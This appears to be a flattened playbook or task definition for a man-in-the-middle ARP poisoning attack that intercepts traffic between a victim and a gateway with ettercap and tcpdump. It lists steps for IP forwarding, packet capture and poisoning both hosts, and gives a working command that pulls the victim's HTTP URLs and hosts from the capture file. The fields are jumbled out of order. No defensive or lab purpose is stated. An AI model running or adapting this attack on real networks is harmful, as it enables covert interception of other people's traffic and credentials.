name: mitm_arp
description: Man-in-the-Middle ARP poisoning attack: intercept traffic between a victim and gateway using ettercap + tcpdump.
author: james-linux

steps.description: Enable IP forwarding for packet relay
Start background packet capture on victim traffic
ARP poison victim and gateway with ettercap

params.command: echo '=== CAPTURED PACKETS ===' && tcpdump -r /tmp/james_mitm.pcap -nn 2>/dev/null | wc -l && echo 'packets captured' && echo '' && echo 'HTTP URLs found:' && tcpdump -r /tmp/james_mitm.pcap -nn -A 2>/dev/null | grep -oP 'GET \S+|POST \S+|Host: \S+' | head -30

steps.description: Analyze captured traffic for HTTP requests
